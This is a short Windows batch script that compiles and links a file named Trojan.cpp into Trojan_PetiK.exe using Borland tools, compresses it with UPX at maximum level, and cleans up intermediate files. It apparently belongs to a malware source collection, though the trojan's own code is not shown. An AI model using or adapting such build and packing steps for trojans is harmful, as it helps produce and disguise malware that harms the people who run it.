@echo off
if exist Trojan.exe del Trojan.exe
rem bcc32 -tW Trojan.cpp
bcc32 -tW -c Trojan.cpp
ilink32 -aa c0w32 Trojan.obj,Trojan_PetiK,,import32 cw32,,
upx -9 Trojan_PetiK.exe
del *.obj
del *.tds
del *.map
del *.il*
